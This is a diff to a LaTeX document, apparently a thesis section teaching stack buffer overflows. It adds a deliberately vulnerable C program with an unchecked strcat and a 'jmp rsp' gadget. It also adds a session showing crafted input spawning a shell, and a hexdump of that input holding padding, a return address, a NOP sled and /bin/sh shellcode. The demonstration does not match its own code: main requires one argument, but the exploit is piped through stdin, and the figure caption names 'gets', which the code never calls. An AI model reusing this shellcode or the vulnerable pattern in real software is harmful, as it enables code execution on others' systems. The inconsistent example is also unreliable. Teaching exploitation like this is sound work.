@@ -522,11 +522,165 @@ execute this code \cite{one1996smashing}. This capability to execute arbitrary
 code gives the attacker full control over the compromised system, thereby
 illustrating the severity and implications of buffer overflow vulnerabilities.
 
-\begin{lstlisting}[caption={Program vulnerable to a buffer  overflow}
-      ,label={lst:label}
-      ,language=Java]
+Below \ref{lst:bof} is an example of a vulnerable program.
 
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Buffer overflow shellcoding example}
+      ,label={lst:bof}
+      ,language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* This function is a gadget typically
+ * found through Return Oriented Programming (ROP)
+ * in a larger binary, and it's crucial
+ * for changing control flow.
+ * It serves to demonstrate the general
+ * concept in this simplified context.
+ *
+ * In a real-life scenario,
+ * it would be necessary to find this gadget
+ * or pivot the stack in a different manner.
+ */
+extern void __attribute__((naked)) helper_gadget() {
+        __asm(".intel_syntax noprefix\n"
+              "jmp rsp\n"
+              ".att_syntax\n");
+}
+
+/* Example of a vulnerable function in which
+ * the size of the concatenated strings is not
+ * checked to be less than the size of the
+ * buffer in which they are concatenated.
+ *
+ * This would most likely never cause issues
+ * because names are almost never this long, but
+ * it is easy for an attacker to exploit this.
+ */
+void say_hi(char* name) {
+        char local_buffer[0x100];
+
+        strcat(local_buffer, "Hi ");
+        strcat(local_buffer, name);
+        strcat(local_buffer, "!");
+
+        puts(local_buffer);
+
+        return;
+}
+
+int main(int argc, char** argv) {
+        if (argc != 2) {
+                fprintf(stderr, "usage: say_hi <name>\n");
+                return 1;
+        }
+
+        say_hi(argv[1]);
+
+        return 0;
+}
 \end{lstlisting}
+\end{minipage}
+
+Running the program with my name gives an expected output:
+\begin{lstlisting}[caption={Non-malicious input}
+      ,label={lst:bof_valid}
+      ,language=bash]
+$ ./say_hi Liviu
+Hi Liviu!
+\end{lstlisting}
+
+But running the program with the following malicious crafted input we get
+a vastly different result:
+
+\begin{lstlisting}[caption={Malicious input}
+      ,label={lst:bof_malicious}
+      ,language=bash]
+# The `cat` command is used just to keep
+# the stdin of the `say_hi` program open
+$ cat shellcode_malicious_input.bin - | ./say_hi
+aaaa
+Hi !
+ls
+Makefile  say_hi  shellcode_malicious_input.bin
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Hexdump of malicious input}
+      ,label={lst:bof_malicous_hex}
+      ,language=bash]
+0000000 0000 0000 0000 0000 0000 0000 0000 0000
+*
+0000100 0000 0000 0000 0000 115a 0040 0000 0000
+0000110 9090 9090 9090 9090 9090 9090 9090 9090
+*
+0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
+0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
+0000330 0101 3101 56f6 086a 485e e601 4856 e689
+0000340 d231 3b6a 0f58 0005
+0000347
+\end{lstlisting}
+Our simple program seems to be behaving like a system shell. We will now analyse
+what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
+is a hexdump of the input. Let's break it down:
+
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=5cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    % Define matrix
+    \matrix [matrix of nodes,
+      nodes=block,
+      column sep=0cm,
+      row sep=0cm
+    ] (stack) {
+      {...} \\
+      |[fill=red!20, minimum height=5em]|
+      {return address (to \emph{libc\_start\_call\_main})} \\
+      {\emph{rbp} of \emph{libc\_start\_call\_main}} \\
+      |[fill=red!20]|
+      {return address (to \emph{main})} \\
+      {\emph{RBP} of \emph{main}} \\
+      |[minimum height=12em]|
+      {\emph{local\_buffer}} \\
+    };
+
+    % Draw arrow with two right angles
+    % \draw [red,thick,->] (stack-1-1.east) -- +(2cm,0) |- (stack-5-1.east) node[midway, right, black] {Pointer};
+    \draw [red,thick,->] ([xshift=3cm]stack-6-1.south east) --
+    ([xshift=0cm]stack-6-1.south east) node[midway, above, black] {rsp};
+
+    \draw [red,thick,->] ([xshift=3cm]stack-4-1.east) --
+    ([xshift=0cm]stack-4-1.east) node[midway, above, black] {rbp};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-6-1.north west) -- (stack-6-1.south west)
+    node[midway,xshift=-1.5cm,] {0x100 bytes};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-5-1.north west) -- (stack-5-1.south west)
+    node[midway,xshift=-1.5cm,] {0x8 bytes};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-4-1.north west) -- (stack-4-1.south west)
+    node[midway,xshift=-1.5cm,] {0x8 bytes};
+
+  % \draw [decorate,decoration={brace,amplitude=10pt}]
+  %     (stack-1-2.north east) -- (stack-3-2.south east)
+  %     node[midway,xshift=1.5cm,] {Group 1};
+
+  \end{tikzpicture}
+  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
+  \label{fig:stackframe}
+\end{figure}
 
 \subsection{Evolution}
 \begin{comment}
@@ -542,6 +696,7 @@ illustrating the severity and implications of buffer overflow vulnerabilities.
   being effective (check offbyonesec talk about windows kernel exploitation, talk
   about)
 \end{comment}
+
 
 \section{Detection techniques}%
 
